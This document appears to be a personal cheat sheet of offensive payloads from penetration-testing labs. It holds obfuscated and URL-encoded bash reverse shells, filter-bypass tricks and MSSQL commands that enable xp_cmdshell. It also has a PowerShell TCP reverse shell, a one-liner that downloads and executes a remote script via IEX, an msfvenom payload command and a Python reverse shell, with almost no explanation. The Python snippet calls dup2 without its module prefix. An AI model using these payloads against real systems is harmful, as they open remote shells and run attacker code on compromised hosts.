#Shell encode

``` 
 bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.134/80+0>%261'
bypass shell:  echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'

```
# exploittation
 go to insite and run: 
``` 
 EXEC sp_configure 'Show Advanced Options', 1;
reconfigure;
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1
reconfigure;
xp_cmdshell "whoami"

```

ReverseShell:
```
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream =
$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =
$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName
System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 |
Out-String );$sendback2 = $sendback + "# ";$sendbyte =
([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyt
e.Length);$stream.Flush()};$client.Close()
``` 
save the shell.ps1 file. then using the python to download 

From the sql cmd: 

xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://IP/shell.ps1\");"

# msf venom

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.37 LPORT=53 -f exe -o reverse64.exe
```
# python

```
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.6",1233));
dup2(s.fileno(),0); 
dup2(s.fileno(),1); 
dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```
